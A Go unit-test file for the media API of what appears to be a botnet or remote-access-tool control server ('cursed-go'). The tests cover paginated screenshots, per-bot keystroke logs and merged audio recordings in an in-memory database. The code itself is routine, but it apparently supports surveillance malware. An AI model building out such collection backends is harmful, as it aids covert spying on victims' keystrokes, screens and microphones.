package api

import (
	"encoding/base64"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"testing"
	"time"

	"github.com/google/uuid"
	"gorm.io/driver/sqlite"
	"gorm.io/gorm"

	"github.com/s045pd/cursed-go/internal/db/models"
)

func setupMediaAPI(t *testing.T) (*MediaAPI, *gorm.DB) {
	t.Helper()
	g, err := gorm.Open(sqlite.Open(":memory:"), &gorm.Config{})
	if err != nil {
		t.Fatal(err)
	}
	if err := g.AutoMigrate(models.All()...); err != nil {
		t.Fatal(err)
	}
	return &MediaAPI{DB: g}, g
}

func TestScreenshots_Pagination(t *testing.T) {
	a, gdb := setupMediaAPI(t)
	botID := uuid.New()
	for i := 0; i < 10; i++ {
		gdb.Create(&models.BotScreenshot{
			BotID: botID, ImageData: "img", Timestamp: time.Now().Add(time.Duration(i) * time.Second),
		})
	}
	r := httptest.NewRequest(http.MethodGet, "/?id="+botID.String()+"&limit=3&offset=0", nil)
	rr := httptest.NewRecorder()
	a.Screenshots(rr, r)
	if rr.Code != http.StatusOK {
		t.Fatalf("status=%d", rr.Code)
	}
	var resp envelope
	_ = json.Unmarshal(rr.Body.Bytes(), &resp)
	if got := len(resp.Result.([]any)); got != 3 {
		t.Errorf("len=%d, want 3", got)
	}
}

func TestKeyboardLogs_BotIDFilter(t *testing.T) {
	a, gdb := setupMediaAPI(t)
	botA := uuid.New()
	botB := uuid.New()
	now := time.Now()
	gdb.Create(&models.BotKeyboardLog{BotID: botA, Keys: "a1", Timestamp: now})
	gdb.Create(&models.BotKeyboardLog{BotID: botA, Keys: "a2", Timestamp: now})
	gdb.Create(&models.BotKeyboardLog{BotID: botB, Keys: "b1", Timestamp: now})

	r := httptest.NewRequest(http.MethodGet, "/?id="+botA.String(), nil)
	rr := httptest.NewRecorder()
	a.KeyboardLogs(rr, r)
	if rr.Code != http.StatusOK {
		t.Fatalf("status=%d", rr.Code)
	}
	var resp envelope
	_ = json.Unmarshal(rr.Body.Bytes(), &resp)
	if got := len(resp.Result.([]any)); got != 2 {
		t.Errorf("expected 2 rows for botA, got %d", got)
	}
}

func TestRecordings(t *testing.T) {
	a, gdb := setupMediaAPI(t)
	botID := uuid.New()
	now := time.Now()
	gdb.Create(&models.BotRecording{Bot: botID, Recording: "abc", Timestamp: &now})
	r := httptest.NewRequest(http.MethodGet, "/?id="+botID.String(), nil)
	rr := httptest.NewRecorder()
	a.Recordings(rr, r)
	if rr.Code != http.StatusOK {
		t.Fatalf("status=%d", rr.Code)
	}
}

func TestAudioSessions_Aggregation(t *testing.T) {
	a, gdb := setupMediaAPI(t)
	botID := uuid.New()
	now := time.Now()
	for i := 0; i < 3; i++ {
		ts := now.Add(time.Duration(i) * time.Second)
		gdb.Create(&models.BotRecording{Bot: botID, Recording: "x", SessionID: "s1", Timestamp: &ts})
	}
	r := httptest.NewRequest(http.MethodGet, "/?id="+botID.String(), nil)
	rr := httptest.NewRecorder()
	a.AudioSessions(rr, r)
	if rr.Code != http.StatusOK {
		t.Fatalf("status=%d body=%s", rr.Code, rr.Body.String())
	}
	var resp envelope
	_ = json.Unmarshal(rr.Body.Bytes(), &resp)
	rows := resp.Result.([]any)
	if len(rows) != 1 {
		t.Fatalf("expected 1 session, got %d", len(rows))
	}
	sess := rows[0].(map[string]any)
	if sess["chunk_count"].(float64) != 3 {
		t.Errorf("chunk_count = %v", sess["chunk_count"])
	}
}

func TestAudioSessionMerge(t *testing.T) {
	a, gdb := setupMediaAPI(t)
	now := time.Now()
	gdb.Create(&models.BotRecording{Bot: uuid.New(), Recording: base64.StdEncoding.EncodeToString([]byte("ab")), SessionID: "s1", Timestamp: &now})
	gdb.Create(&models.BotRecording{Bot: uuid.New(), Recording: base64.StdEncoding.EncodeToString([]byte("cd")), SessionID: "s1", Timestamp: &now})

	r := httptest.NewRequest(http.MethodGet, "/api/v1/audio-session/s1", nil)
	r = r.WithContext(chiRouteCtx("session_id", "s1"))
	rr := httptest.NewRecorder()
	a.AudioSessionMerge(rr, r)
	if rr.Code != http.StatusOK {
		t.Fatalf("status=%d", rr.Code)
	}
	if rr.Header().Get("Content-Type") != "audio/webm" {
		t.Errorf("content-type=%s", rr.Header().Get("Content-Type"))
	}
}
